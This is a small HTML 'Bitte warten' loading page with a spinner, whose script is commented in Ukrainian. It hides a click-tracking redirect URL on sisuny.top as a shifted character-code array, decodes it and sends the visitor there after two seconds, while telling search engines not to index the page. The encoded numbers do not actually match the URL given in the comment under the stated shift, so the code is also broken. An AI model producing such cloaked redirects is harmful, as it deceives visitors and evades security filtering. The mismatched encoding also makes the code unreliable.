<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Bitte warten...</title>
  <meta name="robots" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script>
    
    // КОНСТАНТА ЗСУВУ ДЛЯ ШИФРУВАННЯ (ЗМІНІТЬ ЇЇ, ЯКЩО ПОТРІБНО)
    const SHIFT_KEY = 10;
    
    // Закодована URL: https://sisuny.top/click?o=2&a=1081
    // Це масив ASCII-кодів, зміщених на +10
    const encodedUrl = [
      118, 116, 116, 120, 125, 63, 63, 115, 123, 115, 127, 122, 123, 56, 122, 128, 125, 63,
      119, 122, 115, 125, 117, 119, 118, 126, 63, 129, 60, 52, 63, 107, 60, 50, 53, 58
    ];

    // Функція декодування
    function decodeCipher(arr) {
      return arr.map(code => {
        // Зворотний зсув: віднімаємо SHIFT_KEY
        return String.fromCharCode(code - SHIFT_KEY);
      }).join('');
    }

    // Затримка та декодування
    setTimeout(() => {
      const targetUrl = decodeCipher(encodedUrl);
      
      // Перенаправлення
      window.location.href = targetUrl;
    }, 2000); // 2 секунди затримки
  </script>
  <style>
    /* Стилі залишаються без змін */
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f0f2f5;
      color: #333;
      text-align: center;
      padding-top: 120px;
      margin: 0;
    }

    p {
      font-size: 1.4em;
      margin-bottom: 40px;
    }

    .spinner {
      margin: 0 auto;
      width: 40px;
      height: 40px;
      border: 4px solid #ccc;
      border-top: 4px solid #333;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <p>Bitte warten Sie einen Moment.</p>
  <div class="spinner"></div>
</body>
</html>
